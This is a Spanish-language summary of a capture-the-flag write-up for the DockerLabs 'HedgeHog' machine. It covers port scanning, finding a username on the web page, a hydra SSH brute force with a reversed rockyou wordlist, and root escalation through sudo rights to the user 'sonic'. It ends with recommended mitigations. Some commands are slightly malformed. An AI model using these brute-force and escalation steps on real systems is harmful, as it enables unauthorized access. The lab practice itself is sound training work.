
# HedgeHog

## Resumen breve: 

HedgeHog (DockerLabs) — Máquina Linux orientada a práctica de pentesting básica: escaneo de puertos, enumeración web y SSH, fuerza bruta con diccionarios adaptados, post-explotación y escalada de privilegios mediante uso de sudo y usuarios intermedios. En este laboratorio se detectaron puertos 22 (OpenSSH) y 80 (Apache), se identificó un usuario web/SSH (tails), se adaptó la wordlist rockyou para acelerar el ataque, se obtuvo acceso por SSH y se escaló a root aprovechando privilegios sudo sobre otro usuario (sonic).

Link a máquina en DockerLabs -> [HedgeHog](https://dockerlabs.es/)
Link a WriteUp completo -> [HedgeHog - WriteUp](https://github.com/DanielDominguezBender/dockerlabs.es/blob/main/HedgeHog/HedgeHog.pdf)

## Pasos clave:
1. Desplegar la máquina Docker (script autodeploy.sh) y arrancar la instancia.
2. Escaneo completo con Nmap → puertos 22 y 80 abiertos (OpenSSH y Apache).
3. Enumeración web: página simple con la palabra 'tails' → posible nombre de usuario.
4. Preparar diccionario: limpiar líneas en blanco/espacios y usar tac para invertir rockyou.
5. Fuerza bruta con hydra → acceso SSH con 'tails'.
6. Post-explotación: enumeración local y revisar 'sudo -l'.
7. Escalada: usar 'sudo -u sonic /bin/bash' para obtener shell como sonic y desde ahí 'sudo su' a root.

## Comandos destacados (ejemplos):

**Preparación / despliegue:**
```python
mkdir hedgehog && cd hedgehog
mv ~/Downloads/hedgehog.zip .
sudo unzip hedgehog.zip
sudo chmod +x autodeploy.sh
sudo ./autodeploy hedgehog.tar
```

**Escaneo:**
```python
nmap -sC -sV --min-rate 5000 -A -p- -oN escaneo_hedgehog.txt
Preparar rockyou (limpiar espacios y líneas vacías, invertir):
sed -i 's/[[:space:]]//g' /usr/share/wordlists/rockyou.txt > rockyou_alternativo.txt
tac rockyou_alternativo.txt > /usr/share/wordlists/rockyou_upsidedown.txt
```

**Fuerza bruta SSH con hydra (ejemplo):**
```python
hydra -I -l tails -P /usr/share/wordlists/rockyou_upsidedown.txt ssh://
Post-explotación: enumeración rápida:
uname -a; id; cat /etc/issue; find / -perm -4000 2>/dev/null; sudo -l
```

**Escalada:**
```python
sudo -u sonic /bin/bash
sudo su
```

## Hallazgos y artefactos importantes:

- Puertos abiertos: 22 (SSH) y 80 (HTTP).
- Usuario identificado: tails (pista encontrada en la web).
- Técnica útil: preprocesar rockyou (quitar espacios/line breaks y usar tac) para acelerar la fuerza bruta.
- Vectores de post-explotación: buscar SUIDs y revisar 'sudo -l'; aprovechamiento de permisos sudo de
'sonic' para escalar a root.


## Mitigaciones recomendadas:
- Evitar usuarios con permisos sudo innecesarios; restringir comandos permitidos con sudoers.
- Limitar intentos de fuerza bruta: usar Fail2Ban, rate limiting en SSH y/o autenticación por clave.
- Revisar y auditar archivos SUID; eliminar SUIDs no imprescindibles.
